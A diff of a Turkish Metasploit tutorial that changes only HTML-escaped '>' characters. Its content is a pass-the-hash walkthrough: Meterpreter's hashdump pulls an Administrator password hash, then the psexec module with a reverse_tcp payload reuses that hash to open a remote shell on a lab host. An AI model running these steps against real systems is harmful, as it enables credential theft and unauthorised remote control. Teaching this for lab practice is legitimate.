@@ -58,9 +58,9 @@ Aşağıda, bir exploit kullanılarak Meterpreter oturumu açılmıştır ve `po
 
 
 ```bash
-**[*********]** Meterpreter session 1 opened **(**192.168.57.133:443 -&gt; 192.168.57.131:1042**)**
+**[*********]** Meterpreter session 1 opened **(**192.168.57.133:443 -> 192.168.57.131:1042**)**
 
-meterpreter **&gt;** run post/windows/gather/hashdump 
+meterpreter **>** run post/windows/gather/hashdump 
 
 **[*********]** Obtaining the boot key...
 **[*********]** Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
@@ -69,7 +69,7 @@ meterpreter **&gt;** run post/windows/gather/hashdump
 **[*********]** Dumping password hashes...
 
 Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
-meterpreter **&gt;**```
+meterpreter **>**```
 
 
 
@@ -105,7 +105,7 @@ root@kali:~# msfconsole
 + -- --**=[** 238 payloads - 27 encoders - 8 nops
        **=[** svn r14551 updated yesterday **(**2012.01.14**)**
 
-msf **&gt;** search psexec
+msf **>** search psexec
 
 Exploits
 **========**
@@ -115,16 +115,16 @@ Exploits
    windows/smb/psexec         Microsoft Windows Authenticated User Code Execution
    windows/smb/smb_relay      Microsoft Windows SMB Relay Code Execution
 
-msf **&gt;** use exploit/windows/smb/psexec
-msf exploit**(**psexec**)** **&gt;** set payload windows/meterpreter/reverse_tcp
-payload **=&gt;** windows/meterpreter/reverse_tcp
-msf exploit**(**psexec**)** **&gt;** set LHOST 192.168.57.133
-LHOST **=&gt;** 192.168.57.133
-msf exploit**(**psexec**)** **&gt;** set LPORT 443
-LPORT **=&gt;** 443
-msf exploit**(**psexec**)** **&gt;** set RHOST 192.168.57.140
-RHOST **=&gt;** 192.168.57.140
-msf exploit**(**psexec**)** **&gt;** show options
+msf **>** use exploit/windows/smb/psexec
+msf exploit**(**psexec**)** **>** set payload windows/meterpreter/reverse_tcp
+payload **=>** windows/meterpreter/reverse_tcp
+msf exploit**(**psexec**)** **>** set LHOST 192.168.57.133
+LHOST **=>** 192.168.57.133
+msf exploit**(**psexec**)** **>** set LPORT 443
+LPORT **=>** 443
+msf exploit**(**psexec**)** **>** set RHOST 192.168.57.140
+RHOST **=>** 192.168.57.140
+msf exploit**(**psexec**)** **>** show options
 
 Module options:
 
@@ -161,9 +161,9 @@ Yukarıda görüldüğü gibi `exploit/windows/smb/psexec` modülünde `SMBPass`
 
 
 ```bash
-msf exploit**(**psexec**)** **&gt;** set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
-SMBPass **=&gt;** e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
-msf exploit**(**psexec**)** **&gt;** exploit
+msf exploit**(**psexec**)** **>** set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+SMBPass **=>** e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+msf exploit**(**psexec**)** **>** exploit
 
 **[*********]** Connecting to the server...
 **[*********]** Started reverse handler
@@ -181,15 +181,15 @@ msf exploit**(**psexec**)** **&gt;** exploit
 **[*********]** Closing service handle...
 **[*********]** Deleting \KoVCxCjx.exe...
 **[*********]** Sending stage **(**719360 bytes**)**
-**[*********]** Meterpreter session 1 opened **(**192.168.57.133:443 -&gt; 192.168.57.140:445**)**
+**[*********]** Meterpreter session 1 opened **(**192.168.57.133:443 -> 192.168.57.140:445**)**
 
-meterpreter **&gt;** shell
+meterpreter **>** shell
 Process 3680 created.
 Channel 1 created.
 Microsoft Windows **[**Version 5.2.3790]
 **(**C**)** Copyright 1985-2003 Microsoft Corp.
 
-C:\WINDOWS\system32&gt;
+C:\WINDOWS\system32>
 ```
 
 
